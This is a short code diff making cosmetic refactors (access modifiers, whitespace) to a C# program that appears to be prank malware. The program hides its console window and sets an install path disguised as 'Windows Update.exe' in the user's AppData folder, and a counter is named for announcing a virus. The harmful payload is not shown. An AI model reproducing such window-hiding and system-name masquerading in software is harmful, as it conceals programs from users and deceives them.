@@ -1,5 +1,4 @@
-﻿using Microsoft.Win32;
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.IO;
 using System.Reflection;
@@ -10,17 +9,19 @@ using System.Timers;
 
 namespace computar
 {
-    static class Program
+    internal static class Program
     {
         [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
+        private static extern IntPtr GetConsoleWindow();
 
         [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        static int countdown_yur_compiutar_has_vairus;
-        static readonly Timer timer1 = new Timer();
-        static readonly string location_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft", "Windows Update.exe");
-        static void Main()
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        private static int countdown_yur_compiutar_has_vairus;
+        private static readonly Timer timer1 = new Timer();
+        private static readonly string location_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft", "Windows Update.exe");
+
+        private static void Main()
         {
             var handle = GetConsoleWindow();
             ShowWindow(handle, 0);
@@ -134,7 +135,7 @@ namespace computar
                     Task.Delay(1000);
                     Environment.Exit(0);
                 }
-                catch (Exception) {; }
+                catch (Exception) { }
             }
         }
     }
